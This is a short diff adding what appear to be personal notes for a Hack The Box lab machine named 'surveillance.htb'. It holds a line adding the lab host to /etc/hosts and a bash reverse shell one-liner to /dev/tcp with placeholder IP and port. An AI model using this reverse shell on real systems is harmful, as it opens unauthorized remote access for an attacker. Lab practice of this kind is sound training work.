@@ -1,0 +1,6 @@
+
+sudo echo '10.10.11.245   surveillance.htb'| sudo tee -a /etc/hosts 
+
+bash -i >& /dev/tcp/TU_DIRECCION_IP/TU_PUERTO 0>&1
+
+/home/siemprearmando/Desktop/apuntes/pages-sheet/Untitled D
